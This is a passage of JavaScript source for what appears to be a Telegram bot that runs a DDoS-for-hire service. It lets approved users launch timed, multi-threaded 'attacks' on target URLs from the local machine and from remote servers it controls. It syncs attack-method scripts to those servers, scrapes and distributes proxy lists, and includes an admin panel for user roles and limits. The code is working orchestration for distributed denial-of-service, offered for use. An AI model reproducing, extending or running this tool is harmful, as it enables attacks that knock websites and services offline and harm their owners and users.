  const txt = [
    `${m.emoji || '📦'} <b>${m.name}</b>`,
    ``,
    `📝 <i>${m.desc || 'Attack method'}</i>`,
    ``,
    `<b>Command:</b>`,
    `<code>${esc(m.example)}</code>`,
    ``,
    `<b>Defaults:</b>`,
    `• Threads: ${CONFIG.DEFAULT_THREADS}`,
    `• Rate: ${CONFIG.DEFAULT_RATE}`,
    ``,
    `<b>Example:</b>`,
    `<code>/attack ${m.id} https://example.com 60</code>`,
  ].join('\n');
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: methodMenu(methodId) });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: methodMenu(methodId) });
}

async function showServers(chatId, editMsgId, userId) {
  const stats = serverStats();
  const list = loadServers();
  const txt = [
    `📡 <b>Servers</b>`,
    ``,
    `🟢 ${stats.online} online · 🔴 ${stats.offline} offline · ⚔️ ${stats.attacking} attacking`,
  ];
  if (isAdmin(userId)) {
    txt.push('');
    list.forEach(s => {
      const icon = s.status === 'online' ? '🟢' : s.status === 'offline' ? '🔴' : '⚪';
      const n = [...sessions.values()].filter(x => x.status === 'running' && x.serverId === s.id).length;
      txt.push(`${icon} <b>${esc(s.name)}</b>${n > 0 ? ` ⚔️×${n}` : ''}`);
      txt.push(`  <code>${esc(s.host)}:${s.port}</code>`);
    });
  }
  if (editMsgId) await edit(chatId, editMsgId, txt.join('\n'), { reply_markup: backMenu() });
  else await bot.sendMessage(chatId, txt.join('\n'), { parse_mode: 'HTML', reply_markup: backMenu() });
}

async function showStatus(chatId, editMsgId, userId) {
  const mine = [...sessions.values()].filter(s => s.owner === userId && s.status === 'running');
  const stats = serverStats();
  const txt = [
    `📊 <b>Live Status</b>`,
    ``,
    `📡 ${stats.online}/${stats.total} online · ${stats.attacking} attacking`,
    ``,
  ];
  if (mine.length === 0) txt.push('📭 <i>No active sessions.</i>');
  else {
    mine.forEach(s => {
      const elapsed = Math.floor((Date.now() - s.startedAt) / 1000);
      txt.push(`<code>${s.id}</code> · ${s.methodName} · ${esc(s.target)}`);
      txt.push(`  ⏱ ${elapsed}s / ${s.duration}s`);
    });
  }
  if (editMsgId) await edit(chatId, editMsgId, txt.join('\n'), { reply_markup: backMenu() });
  else await bot.sendMessage(chatId, txt.join('\n'), { parse_mode: 'HTML', reply_markup: backMenu() });
}

async function showMethods(chatId, editMsgId) {
  const list = allMethods();
  const txt = [`📦 <b>Attack Methods</b>`, ''];
  list.forEach(m => {
    const ok = fs.existsSync(path.join(CONFIG.SCRIPT_DIR, m.file));
    const tag = m.builtin ? '' : ' 🔧';
    txt.push(`${m.emoji || '📦'} <b>${m.name}</b>${tag} ${ok ? '' : '❌'}`);
    txt.push(`  <code>${esc(m.example)}</code>`);
  });
  if (editMsgId) await edit(chatId, editMsgId, txt.join('\n'), { reply_markup: backMenu() });
  else await bot.sendMessage(chatId, txt.join('\n'), { parse_mode: 'HTML', reply_markup: backMenu() });
}

async function showAdminPanel(chatId, editMsgId) {
  const users = loadUsers();
  const total = Object.keys(users).length;
  const admins = Object.values(users).filter(u => u.role === 'admin').length;
  const pending = Object.values(users).filter(u => u.role === 'pending').length;
  const s = serverStats();
  const m = allMethods().length;
  const txt = [
    `👑 <b>Admin Panel</b>`,
    ``,
    `👥 Users: <b>${total}</b> (${admins} admin, ${pending} pending)`,
    `📡 Servers: <b>${s.online}/${s.total}</b> online`,
    `📦 Methods: <b>${m}</b> loaded`,
    `⚔️ Active: ${[...sessions.values()].filter(x => x.status === 'running').length}`,
    ``,
    `<i>Use buttons below.</i>`,
  ].join('\n');
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: adminMenu() });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: adminMenu() });
}

async function showAdminUsers(chatId, editMsgId) {
  const list = Object.values(loadUsers());
  const kb = [];
  list.forEach(u => {
    const icon = u.role === 'admin' ? '👑' : u.role === 'user' ? '✅' : u.role === 'banned' ? '🚫' : '⏳';
    const style = u.role === 'admin' ? 'danger' : (u.role === 'user' ? 'success' : 'primary');
    kb.push([{ text: `${icon} ${u.firstName || u.username || u.telegramId}`, callback_data: `usr_${u.telegramId}`, style }]);
  });
  kb.push([coloredBtn('⬅️ Back', 'menu_admin', 'primary')]);
  const txt = `👥 <b>Users (${list.length})</b>\n\nClick a user to manage.`;
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: { inline_keyboard: kb } });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

async function showUserActions(chatId, editMsgId, targetId) {
  const u = getUser(targetId);
  if (!u) return;
  const l = u.limits || {};
  const kb = [
    [
      coloredBtn('✅ Approve', `approve_${targetId}`, 'success'),
      coloredBtn('🚫 Ban', `ban_${targetId}`, 'danger'),
    ],
    [
      coloredBtn(`⏱ Max Dur (${l.maxDuration || '∞'})`, `setdur_${targetId}`, 'primary'),
      coloredBtn(`⚔️ Max Conc (${l.maxConcurrent || '∞'})`, `setconc_${targetId}`, 'primary')
    ],
    [coloredBtn('❌ Delete', `del_${targetId}`, 'danger')],
    [coloredBtn('⬅️ Back', 'adm_users', 'primary')],
  ];
  const txt = [
    `👤 <b>${esc(u.firstName || u.username || targetId)}</b>`,
    `ID: <code>${targetId}</code>`,
    `Role: <b>${u.role}</b>`,
    ``,
    `Duration: ${l.maxDuration || '∞'} · Threads: ${l.maxThreads || '∞'}`,
    `Rate: ${l.maxRate || '∞'} · Concurrent: ${l.maxConcurrent || '∞'}`,
    `Cooldown: ${l.cooldown || 0}s`,
    ``,
    `<i>Click below to change limits.</i>`
  ].join('\n');
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: { inline_keyboard: kb } });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

async function showAdminServers(chatId, editMsgId) {
  const list = loadServers();
  const kb = [];
  list.forEach(s => {
    kb.push([{ text: `🖥 ${s.name} (${s.status})`, callback_data: `srv_${s.id}`, style: s.status === 'online' ? 'success' : 'danger' }]);
  });
  kb.push([coloredBtn('➕ Add New Server', 'addsrv_start', 'primary')]);
  kb.push([coloredBtn('🔄 Sync All Methods to Servers', 'syncall_methods', 'success')]);
  kb.push([coloredBtn('⬅️ Back', 'menu_admin', 'primary')]);

  const txt = `🖥 <b>Manage Servers (${list.length})</b>\n\nClick to view, or push all methods everywhere.`;
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: { inline_keyboard: kb } });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

async function showServerActions(chatId, editMsgId, serverId) {
  const s = getServer(serverId);
  if (!s) return;
  const kb = [
    [coloredBtn('🔄 Sync All Scripts', `srv_sync_${serverId}`, 'primary')],
    [coloredBtn('❌ Delete Server', `srv_del_${serverId}`, 'danger')],
    [coloredBtn('⬅️ Back', 'adm_servers', 'primary')]
  ];
  const txt = [
    `🖥 <b>${esc(s.name)}</b>`,
    `Host: <code>${s.host}:${s.port}</code>`,
    `Status: <b>${s.status}</b>`,
    `User: ${s.username}`
  ].join('\n');
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: { inline_keyboard: kb } });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

async function showAdminMethods(chatId, editMsgId) {
  const list = allMethods();
  const kb = [];
  list.forEach(m => {
    const ok = fs.existsSync(path.join(CONFIG.SCRIPT_DIR, m.file));
    const icon = m.builtin ? '📦' : '🔧';
    const status = ok ? '✅' : '❌';
    kb.push([{
      text: `${icon} ${m.name} ${status}`,
      callback_data: `methodview_${m.id}`,
      style: m.builtin ? 'primary' : 'success',
    }]);
  });
  kb.push([coloredBtn('➕ Add New Method', 'addmethod_start', 'success')]);
  kb.push([coloredBtn('⬅️ Back', 'menu_admin', 'primary')]);
  const txt = `📦 <b>Manage Methods (${list.length})</b>\n\nClick a method to view template, re-sync, or delete.`;
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: { inline_keyboard: kb } });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

async function showAdminMethodDetail(chatId, editMsgId, methodId) {
  const m = getMethod(methodId);
  if (!m) return;
  const fileExists = fs.existsSync(path.join(CONFIG.SCRIPT_DIR, m.file));

  const txt = [
    `${m.emoji || '📦'} <b>${m.name}</b>`,
    `ID: <code>${m.id}</code>`,
    `File: <code>${m.file}</code> ${fileExists ? '✅' : '❌'}`,
    `Type: <b>${m.builtin ? 'built-in' : 'custom'}</b>`,
    ``,
    `📝 <b>Example:</b>`,
    `<code>${esc(m.example)}</code>`,
  ];

  if (!m.builtin && m.template) {
    txt.push('');
    txt.push('🔧 <b>Template:</b>');
    txt.push(`<code>${esc(m.template)}</code>`);
    txt.push('');
    txt.push('<i>$1=target · $2=duration · $3=threads · $4=rate · {proxy}=proxy.txt</i>');
    if (m.sample) {
      txt.push('');
      txt.push('📋 <b>Original sample:</b>');
      txt.push(`<code>${esc(m.sample)}</code>`);
    }
  }

  const kb = [];
  if (!m.builtin) {
    kb.push([coloredBtn('🧪 Test Parse', `method_test_${methodId}`, 'primary')]);
    kb.push([coloredBtn('🔄 Re-sync to All Servers', `method_resync_${methodId}`, 'primary')]);
    kb.push([coloredBtn('🗑 Delete Method', `method_delete_${methodId}`, 'danger')]);
  }
  kb.push([coloredBtn('⬅️ Back', 'adm_methods', 'primary')]);

  if (editMsgId) await edit(chatId, editMsgId, txt.join('\n'), { reply_markup: { inline_keyboard: kb } });
  else await bot.sendMessage(chatId, txt.join('\n'), { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

/* --- PROXY MANAGEMENT --- */

async function showAdminProxies(chatId, editMsgId) {
  const proxies = readProxies();
  const kb = [
    [coloredBtn('📁 Upload .txt File', 'proxy_upload', 'success')],
    [coloredBtn('🔄 Update from GitHub', 'proxy_scrape', 'primary')],
    [coloredBtn('📤 Sync to All Servers', 'proxy_syncall', 'primary')],
    [coloredBtn('🗑 Clear Proxies', 'proxy_clear', 'danger')],
    [coloredBtn('⬅️ Back', 'menu_admin', 'primary')]
  ];
  const txt = [
    `🌐 <b>Proxy Manager</b>`,
    ``,
    `Total active proxies: <b>${proxies.length}</b>`,
    ``,
    `<i>Upload a .txt file, or fetch fresh ones from GitHub.</i>`
  ].join('\n');
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: { inline_keyboard: kb } });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

/* ══════════════════════════ ATTACK LAUNCHER ══════════════════════════ */

async function runAttack(user, method, parsed, chatId) {
  const serversToUse = loadServers().filter(s => s.status === 'online');
  const totalTargets = 1 + serversToUse.length;
  const batchId = newBatchId();

  const progress = await bot.sendMessage(chatId,
    `🚀 <b>Launching</b> ${method.name}\n` +
    `🎯 Target: <code>${esc(parsed.target)}</code>\n` +
    `⏱ ${parsed.duration}s · ${parsed.threads}T · ${parsed.rate}R\n\n` +
    `⚡ Dispatching to ${totalTargets} node(s)...`,
    { parse_mode: 'HTML' }
  );

  await prewarmServers(serversToUse.map(s => s.id));

  const launchPromises = [];

  launchPromises.push((async () => {
    try {
      const session = launchLocal(user, method, parsed.args, batchId);
      return { ok: true, session };
    } catch (e) { return { ok: false, error: e.message }; }
  })());

  for (const s of serversToUse) {
    launchPromises.push((async () => {
      try {
        const session = await launchRemote(user, method, parsed.args, s.id, batchId);
        return { ok: true, session };
      } catch (e) { return { ok: false, error: e.message }; }
    })());
  }

  const launched = await Promise.all(launchPromises);
  const okCount = launched.filter(l => l.ok).length;

  if (okCount > 0) {
    batches.set(batchId, {
      chatId, total: okCount, pending: okCount,
      methodName: method.name,
      target: parsed.target,
      duration: parsed.duration,
    });
  }

  if (user.limits && user.limits.cooldown > 0) {
    cooldowns.set(user.telegramId, { until: Date.now() + user.limits.cooldown * 1000 });
  }

  const newStats = serverStats();
  audit('attack_launched', user.telegramId, {
    method: method.id, target: parsed.target,
    servers: serversToUse.map(s => s.id), ok: okCount,
  });

  const lines = [
    okCount > 0 ? '✅ <b>Attack dispatched</b>' : '❌ <b>Attack failed</b>',
    '',
    `📦 Method: <b>${method.name}</b>`,
    `🎯 Target: <code>${esc(parsed.target)}</code>`,
    `⏱ ${parsed.duration}s · ${parsed.threads}T · ${parsed.rate}R`,
    '',
    `📡 Servers: ${newStats.online}/${newStats.total} online · ${newStats.attacking} attacking`,
    `🎯 Launched: <b>${okCount}</b>/${totalTargets} node(s)`,
  ];
  if (okCount < totalTargets) {
    const fails = launched.filter(l => !l.ok).slice(0, 3).map(l => `• ${l.error}`);
    lines.push(`\n⚠️ ${totalTargets - okCount} node(s) failed:`);
    fails.forEach(f => lines.push(f));
  }
  if (okCount > 0) lines.push(`\n<i>You will be notified when attack finishes.</i>`);

  const doneKb = { inline_keyboard: [[coloredBtn('📊 Check Status', 'menu_status', 'primary')]] };
  await edit(chatId, progress.message_id, lines.join('\n'), { reply_markup: doneKb });
}

/* ══════════════════════════ COMMANDS ══════════════════════════ */

bot.onText(/^\/start/, async (msg) => {
  ensureUserExists(msg);
  await showMainMenu(msg.chat.id);
});

bot.onText(/^\/menu/, async (msg) => {
  ensureUserExists(msg);
  await showMainMenu(msg.chat.id);
});

bot.onText(/^\/attack(?:\s+(.+))?/, async (msg, match) => {
  const user = ensureUserExists(msg);

  if (!match[1]) return showAttackMenu(msg.chat.id);

  if (user.role === 'pending') return reply(msg, '⏳ <b>Pending approval.</b>\nContact admin to activate.');
  if (user.role === 'banned') return reply(msg, '🚫 <b>Banned.</b>');

  const args = match[1].trim().split(/\s+/);
  const methodId = args[0];
  const method = getMethod(methodId);
  if (!method) return reply(msg, `❌ Unknown method <code>${esc(methodId)}</code>\nUse /methods to see all.`);
  if (!fs.existsSync(path.join(CONFIG.SCRIPT_DIR, method.file))) return reply(msg, `❌ Missing file: <code>${method.file}</code>`);

  const cd = cooldowns.get(msg.from.id);
  if (cd && cd.until > Date.now()) {
    const left = Math.ceil((cd.until - Date.now()) / 1000);
    return reply(msg, `⏳ Cooldown: <b>${left}s</b> remaining.`);
  }

  const limit = user.limits?.maxConcurrent || 0;
  if (limit > 0 && userActiveSessions(msg.from.id) >= limit) {
    return reply(msg, `❌ Max concurrent (${limit}) reached.`);
  }

  let parsed;
  try {
    parsed = method.parse(args.slice(1));
    if (!parsed.target || !parsed.duration) {
      return reply(msg, `❌ Missing args.\n<b>Usage:</b> <code>${esc(method.example)}</code>`);
    }
    const t = validateTarget(parsed.target);
    if (isBlacklisted(t.host)) return reply(msg, `🚫 <code>${esc(t.host)}</code> is blacklisted.`);
    checkLimits(user, parsed.duration, parsed.threads, parsed.rate);
  } catch (e) { return reply(msg, `❌ ${esc(e.message)}`); }

  await runAttack(user, method, parsed, msg.chat.id);
});

bot.onText(/^\/methods/, async (msg) => {
  ensureUserExists(msg);
  await showMethods(msg.chat.id);
});

bot.onText(/^\/servers/, async (msg) => {
  ensureUserExists(msg);
  await showServers(msg.chat.id, null, msg.from.id);
});

bot.onText(/^\/status/, async (msg) => {
  ensureUserExists(msg);
  await showStatus(msg.chat.id, null, msg.from.id);
});

bot.onText(/^\/me/, async (msg) => {
  const user = ensureUserExists(msg);
  const l = user.limits || {};
  const cd = cooldowns.get(msg.from.id);
  const cdLeft = cd && cd.until > Date.now() ? Math.ceil((cd.until - Date.now()) / 1000) : 0;
  await reply(msg, [
    `👤 <b>Account</b>`,
    `ID: <code>${user.telegramId}</code>`,
    `Role: <b>${user.role}</b>`,
    '',
    `<b>Limits:</b>`,
    `Duration: ${l.maxDuration || '∞'} · Threads: ${l.maxThreads || '∞'}`,
    `Rate: ${l.maxRate || '∞'} · Concurrent: ${l.maxConcurrent || '∞'}`,
    `Cooldown: ${l.cooldown || 0}s`,
    cdLeft > 0 ? `\n⏳ Cooldown: <b>${cdLeft}s</b>` : '',
  ].join('\n'), { reply_markup: mainMenu(msg.from.id) });
});

bot.onText(/^\/stop(?:\s+(.+))?/, async (msg, match) => {
  ensureUserExists(msg);
  const id = match[1];
  if (!id) return reply(msg, 'Usage: <code>/stop &lt;session_id&gt;</code>');
  const s = sessions.get(id);
  if (!s) return reply(msg, '❌ Not found.');
  if (s.owner !== msg.from.id && !isAdmin(msg.from.id)) return reply(msg, '❌ Not your session.');
  stopSession(id, 'manual');
  await reply(msg, `✅ Stopped <code>${id}</code>`);
});

bot.onText(/^\/killall/, async (msg) => {
  if (!isAdmin(msg.from.id)) return reply(msg, '🚫 Admin only.');
  const killed = stopAllSessions(null);
  await reply(msg, killed > 0 ? `💀 Killed <b>${killed}</b> session(s).` : '📭 No active sessions.');
});

bot.onText(/^\/scrape/, async (msg) => {
  const user = ensureUserExists(msg);
  if (!isAdmin(msg.from.id) && user.role !== 'user') return reply(msg, '❌ Denied.');
  await reply(msg, '🔄 Scraping proxies...');
  try {
    const n = await scrapeProxies();
    await reply(msg, `✅ Added <b>${n}</b> new proxies.\n\n<i>Admin: use Admin Panel → Proxies → Sync.</i>`);
  } catch (e) { await reply(msg, `❌ ${esc(e.message)}`); }
});

bot.onText(/^\/syncmethods/, async (msg) => {
  if (!isAdmin(msg.from.id)) return reply(msg, '🚫 Admin only.');
  const servers = loadServers().filter(s => s.status === 'online');
  if (servers.length === 0) return reply(msg, '📭 No online servers.');
  await reply(msg, `🔄 Syncing ${allMethods().length} methods to ${servers.length} servers...`);
  let ok = 0;
  await Promise.allSettled(servers.map(async (s) => {
    try { await syncMethodToServer(s.id, null); ok++; } catch {}
  }));
  await reply(msg, `✅ Synced to <b>${ok}/${servers.length}</b> servers.`);
});

bot.onText(/^\/admin/, async (msg) => {
  if (!isAdmin(msg.from.id)) return reply(msg, '🚫 Admin only.');
  await showAdminPanel(msg.chat.id);
});

/* ══════════════════════════ CALLBACK ROUTER ══════════════════════════ */

bot.on('callback_query', async (q) => {
  const chatId = q.message.chat.id;
  const msgId = q.message.message_id;
  const userId = q.from.id;
  const data = q.data;

  try {
    /* Main menus */
    if (data === 'menu_main') { await answerCB(q.id, '🏠 Main menu'); return showMainMenu(chatId, msgId); }
    if (data === 'menu_attack') { await answerCB(q.id, '🚀 Choose method'); return showAttackMenu(chatId, msgId); }
    if (data === 'menu_status') { await answerCB(q.id, '📊 Status'); return showStatus(chatId, msgId, userId); }
    if (data === 'menu_servers') { await answerCB(q.id, '📡 Servers'); return showServers(chatId, msgId, userId); }
    if (data === 'menu_methods') { await answerCB(q.id, '📦 Methods'); return showMethods(chatId, msgId); }
    if (data === 'menu_admin') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫 Admin only', true);
      await answerCB(q.id, '👑 Admin');
      return showAdminPanel(chatId, msgId);
    }

    /* Method detail (user view) */
    if (data.startsWith('method_') && !data.startsWith('methodview_') && !data.startsWith('method_test_') && !data.startsWith('method_resync_') && !data.startsWith('method_delete_')) {
      const methodId = data.slice('method_'.length);
      await answerCB(q.id, '📦 Method');
      return showMethodDetail(chatId, msgId, methodId);
    }

    /* Quick launch */
    if (data.startsWith('quick_')) {
      const methodId = data.slice('quick_'.length);
      const m = getMethod(methodId);
      if (!m) return answerCB(q.id, '❌ Method not found', true);
      pendingInput.set(userId, {
        action: 'quick_launch_target',
        data: { methodId },
        expires: Date.now() + 120000,
      });
      await answerCB(q.id, '⚡ Quick launch started');
      return bot.sendMessage(chatId,
        `⚡ <b>Quick Launch: ${m.name}</b>\n\n` +
        `Step 1/2 — Send the target URL:\n` +
        `<i>Example:</i> <code>https://example.com</code>\n\n` +
        `<i>Type /cancel to abort</i>`,
        { parse_mode: 'HTML', reply_markup: { force_reply: true, selective: true } }
      );
    }

    /* Admin — methods */
    if (data === 'adm_methods') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫 Admin only', true);
      await answerCB(q.id, '📦 Methods');
      return showAdminMethods(chatId, msgId);
    }
    if (data.startsWith('methodview_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫 Admin only', true);
      const methodId = data.slice('methodview_'.length);
      await answerCB(q.id, '📦 Method');
      return showAdminMethodDetail(chatId, msgId, methodId);
    }
    if (data.startsWith('method_test_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫 Admin only', true);
      const methodId = data.slice('method_test_'.length);
      const m = getMethod(methodId);
      if (!m) return answerCB(q.id, '❌ Not found', true);
      if (m.builtin) return answerCB(q.id, 'Built-in — no template to test.', true);
      try {
        const testArgs = buildArgsFromTemplate(m.template, 'https://test.local', '60', '16', '90');
        const cmd = `node ${m.file} ${testArgs.join(' ')}`;
        await answerCB(q.id, '🧪 Test OK', true);
        return edit(chatId, msgId,
          `🧪 <b>Test Parse — ${m.name}</b>\n\n` +
          `<b>Template:</b>\n<code>${esc(m.template)}</code>\n\n` +
          `<b>Input:</b> target=https://test.local  dur=60  th=16  rate=90\n\n` +
          `<b>Command that would run:</b>\n<code>${esc(cmd)}</code>`,
          { reply_markup: { inline_keyboard: [[coloredBtn('⬅️ Back', `methodview_${methodId}`, 'primary')]] } }
        );
      } catch (e) {
        return answerCB(q.id, '❌ ' + e.message, true);
      }
    }
    if (data.startsWith('method_resync_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫 Admin only', true);
      const methodId = data.slice('method_resync_'.length);
      const m = getMethod(methodId);
      if (!m) return answerCB(q.id, '❌ Not found', true);
      await answerCB(q.id, '🔄 Syncing...', true);
      const servers = loadServers().filter(s => s.status === 'online');
      let ok = 0;
      await Promise.allSettled(servers.map(async (s) => {
        try { await syncMethodToServer(s.id, m.file); ok++; } catch {}
      }));
      await answerCB(q.id, `Synced to ${ok}/${servers.length}`, true);
      return showAdminMethodDetail(chatId, msgId, methodId);
    }
    if (data.startsWith('method_delete_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫 Admin only', true);
      const methodId = data.slice('method_delete_'.length);
      const list = loadCustomMethods();
      const idx = list.findIndex(x => x.id === methodId);
      if (idx >= 0) {
        list.splice(idx, 1);
        saveCustomMethods(list);
        await answerCB(q.id, '🗑 Deleted', true);
      } else {
        await answerCB(q.id, 'Built-in — not deletable', true);
      }
      return showAdminMethods(chatId, msgId);
    }
    if (data === 'addmethod_start') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫 Admin only', true);
      pendingInput.set(userId, { action: 'addmethod_file', data: {}, expires: Date.now() + 300000 });
      await answerCB(q.id, 'Awaiting file');
      return bot.sendMessage(chatId,
        `🔧 <b>Add New Method</b>\n\n` +
        `Step 1/4 — Send the <code>.js</code> file as a document.\n\n` +
        `<i>Type /cancel to abort</i>`,
        { parse_mode: 'HTML', reply_markup: { force_reply: true, selective: true } }
      );
    }
    if (data === 'addmethod_save') {
      const pending = pendingInput.get(userId);
      if (!pending || pending.action !== 'addmethod_confirm') return answerCB(q.id, '❌ No pending method', true);
      const d = pending.data;

      // Save method
      const list = loadCustomMethods();
      list.push({
        id: d.methodId,
        name: d.methodId,
        file: d.fileName,
        template: d.template,
        sample: d.sampleCmd,
        example: `/attack ${d.methodId} <url> <dur>`,
        addedBy: userId,
        addedAt: new Date().toISOString(),
      });
      saveCustomMethods(list);
      pendingInput.delete(userId);

      await answerCB(q.id, '✅ Saved', true);
      const sm = await bot.sendMessage(chatId, '⚙️ Syncing to all online servers...');

      const servers = loadServers().filter(s => s.status === 'online');
      let ok = 0;
      await Promise.allSettled(servers.map(async (s) => {
        try { await syncMethodToServer(s.id, d.fileName); ok++; } catch {}
      }));

      await edit(chatId, sm.message_id,
        `✅ <b>Method Added & Live!</b>\n\n` +
        `📦 ID: <code>${d.methodId}</code>\n` +
        `📄 File: <code>${d.fileName}</code>\n` +
        `🔧 Template: <code>${esc(d.template)}</code>\n\n` +
        `🎯 Try it:\n<code>/attack ${d.methodId} https://example.com 60</code>\n\n` +
        `📤 Synced to ${ok}/${servers.length} servers.`,
        { reply_markup: { inline_keyboard: [[coloredBtn('⬅️ Back to Methods', 'adm_methods', 'primary')]] } }
      );
      return;
    }
    if (data === 'addmethod_cancel') {
      pendingInput.delete(userId);
      await answerCB(q.id, '❌ Cancelled', true);
      return showAdminMethods(chatId, msgId);
    }

    /* Admin — users */
    if (data === 'adm_users') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫 Admin only', true);
      await answerCB(q.id, '👥 Users');
      return showAdminUsers(chatId, msgId);
    }
    if (data.startsWith('usr_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫 Admin only', true);
      const targetId = data.slice('usr_'.length);
      await answerCB(q.id, '👤 User');
      return showUserActions(chatId, msgId, targetId);
    }
    if (data.startsWith('approve_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫 Admin only', true);
      const targetId = data.slice('approve_'.length);
      upsertUser(targetId, { role: 'user' });
      await answerCB(q.id, '✅ Approved', true);
      return showUserActions(chatId, msgId, targetId);
    }
    if (data.startsWith('ban_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫 Admin only', true);
      const targetId = data.slice('ban_'.length);
      if (isAdmin(Number(targetId))) return answerCB(q.id, '❌ Cannot ban admin', true);
      upsertUser(targetId, { role: 'banned' });
      await answerCB(q.id, '🚫 Banned', true);
      return showUserActions(chatId, msgId, targetId);
    }
    if (data.startsWith('del_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫 Admin only', true);
      const targetId = data.slice('del_'.length);
      if (isAdmin(Number(targetId))) return answerCB(q.id, '❌ Cannot delete admin', true);
      const users = loadUsers();
      delete users[targetId];
      saveUsers(users);
      await answerCB(q.id, '❌ Deleted', true);
      return showAdminUsers(chatId, msgId);
    }
    if (data.startsWith('setdur_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫 Admin only', true);
      const targetId = data.slice('setdur_'.length);
      pendingInput.set(userId, { action: 'set_limit_duration', data: { targetId }, expires: Date.now() + 60000 });
      await answerCB(q.id, 'Enter duration');
      return bot.sendMessage(chatId, `⏱ Send max duration in seconds for this user (e.g. <code>60</code>).\n<i>Send 0 for unlimited.</i>`, { parse_mode: 'HTML', reply_markup: { force_reply: true, selective: true } });
    }
    if (data.startsWith('setconc_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫 Admin only', true);
      const targetId = data.slice('setconc_'.length);
      pendingInput.set(userId, { action: 'set_limit_conc', data: { targetId }, expires: Date.now() + 60000 });
      await answerCB(q.id, 'Enter concurrents');
      return bot.sendMessage(chatId, `⚔️ Send max concurrent attacks for this user (e.g. <code>1</code>).\n<i>Send 0 for unlimited.</i>`, { parse_mode: 'HTML', reply_markup: { force_reply: true, selective: true } });
    }

    /* Admin — servers */
    if (data === 'adm_servers') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫 Admin only', true);
      await answerCB(q.id, '🖥 Servers');
      return showAdminServers(chatId, msgId);
    }
    if (data === 'syncall_methods') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫 Admin only', true);
      await answerCB(q.id, '🔄 Syncing all methods...', true);
      const servers = loadServers().filter(s => s.status === 'online');
      if (servers.length === 0) return answerCB(q.id, '📭 No online servers', true);
      let ok = 0;
      await Promise.allSettled(servers.map(async (s) => {
        try { await syncMethodToServer(s.id, null); ok++; } catch {}
      }));
      await answerCB(q.id, `Synced to ${ok}/${servers.length} servers`, true);
      return showAdminServers(chatId, msgId);
    }
    if (data.startsWith('srv_') && !data.startsWith('srv_sync_') && !data.startsWith('srv_del_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫 Admin only', true);
      const srvId = data.slice('srv_'.length);
      await answerCB(q.id, '🖥 Server');
      return showServerActions(chatId, msgId, srvId);
    }
    if (data.startsWith('srv_del_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫 Admin only', true);
      const srvId = data.slice('srv_del_'.length);
      removeServer(srvId);
      await answerCB(q.id, '❌ Server deleted', true);
      return showAdminServers(chatId, msgId);
    }
    if (data.startsWith('srv_sync_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫 Admin only', true);
      const srvId = data.slice('srv_sync_'.length);
      await answerCB(q.id, '🔄 Syncing...', true);
      try { await syncMethodToServer(srvId, null); } catch {}
      return showServerActions(chatId, msgId, srvId);
    }
    if (data === 'addsrv_start') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫 Admin only', true);
      pendingInput.set(userId, { action: 'addserver_addr', data: {}, expires: Date.now() + 120000 });
      await answerCB(q.id, 'Add Server');
      return bot.sendMessage(chatId,
        `🔌 <b>Add New Server</b>\n\nStep 1/3 — Send <code>IP:PORT</code>\n<i>Example:</i> <code>1.2.3.4:22</code>\n\n<i>Type /cancel to abort</i>`,
        { parse_mode: 'HTML', reply_markup: { force_reply: true, selective: true } }
      );
    }

    /* Admin — proxies */
    if (data === 'adm_proxies') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫 Admin only', true);
      await answerCB(q.id, '🌐 Proxies');
      return showAdminProxies(chatId, msgId);
    }
    if (data === 'proxy_upload') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫 Admin only', true);
      pendingInput.set(userId, { action: 'addproxy_file', data: {}, expires: Date.now() + 120000 });
      await answerCB(q.id, 'Upload mode');
      return bot.sendMessage(chatId,
        `📁 <b>Upload Proxy File</b>\n\nSend a <code>.txt</code> file containing proxies (IP:PORT per line).\n\n<i>Type /cancel to abort</i>`,
        { parse_mode: 'HTML', reply_markup: { force_reply: true, selective: true } }
      );
    }
    if (data === 'proxy_scrape') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫 Admin only', true);
      await answerCB(q.id, '🔄 Scraping...', true);
      const added = await scrapeProxies();
      const total = readProxies().length;
